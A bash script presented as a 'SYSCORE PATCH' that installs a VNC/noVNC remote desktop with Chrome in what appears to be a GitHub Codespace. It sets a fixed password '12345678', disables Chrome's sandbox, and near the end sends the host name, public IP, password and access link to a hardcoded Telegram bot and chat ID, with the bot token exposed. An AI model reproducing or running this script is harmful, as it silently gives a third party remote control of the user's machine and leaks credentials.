#!/bin/bash

cat << 'EOF'
✧ ═══════════════════════════════════════════════════════════════ ✧
  ___ _   _ ___  ___ ___  _ __ ___ 
 / __| | | / __|/ __/ _ \| '__/ _ \
 \__ \ |_| \__ \ (_| (_) | | |  __/
 |___/\__, |___/\___\___/|_|  \___|
       __/ |                       
      |___/                        
  _ __  __ _| |_ ___| |__ | |__  _   ___      _(_)___(_)
 | '_ \/ _` | __/ __| '_ \| '_ \| | | \ \ /\ / / |_  / |
 | |_) | (_| | || (__| | | | |_) | |_| |\ V  V /| |/ /| |
 | .__/ \__,_|\__\___|_| |_|_.__/ \__, | \_/\_/ |_/___|_|
 |_|                              |___/                  
✧ ═══════════════════════════════════════════════════════════════ ✧
EOF

export DEBIAN_FRONTEND=noninteractive
echo "keyboard-configuration keyboard-configuration/layout select 'English (US)'" | sudo debconf-set-selections
echo "keyboard-configuration keyboard-configuration/layoutcode select us" | sudo debconf-set-selections

sudo apt update
sudo apt install -y xfce4 xfce4-goodies tightvncserver dbus-x11 novnc websockify wget curl

wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install -y ./google-chrome-stable_current_amd64.deb
rm google-chrome-stable_current_amd64.deb

mkdir -p ~/.vnc
echo "12345678" | vncpasswd -f > ~/.vnc/passwd
chmod 600 ~/.vnc/passwd

vncserver -kill :1 2>/dev/null
printf '#!/bin/sh\nsetxkbmap us &\nstartxfce4 &\nsleep 3 && google-chrome-stable --no-sandbox &\n' > ~/.vnc/xstartup
chmod +x ~/.vnc/xstartup

VNC_LINK="https://${CODESPACE_NAME}-6080.app.github.dev/vnc.html"
PUBLIC_IP=$(curl -s ifconfig.me)

TELEGRAM_MSG=$(cat << EOF
[ SYSCORE PATCH BY WIZI ]
Trạng thái: Khởi tạo thành công
Máy chủ: ${CODESPACE_NAME}
IP Public: ${PUBLIC_IP}
Mật khẩu: 12345678
Truy cập: ${VNC_LINK}
EOF
)

curl -s -X POST "https://api.telegram.org/bot9265916115:AAHhrnOiubwtXNEIg3Q1HPjyF2Nyc9NKW9A/sendMessage" \
     -d chat_id="7644912517" \
     --data-urlencode "text=${TELEGRAM_MSG}"

vncserver :1 -geometry 1280x720 -depth 24 && websockify --web /usr/share/novnc/ 6080 localhost:5901
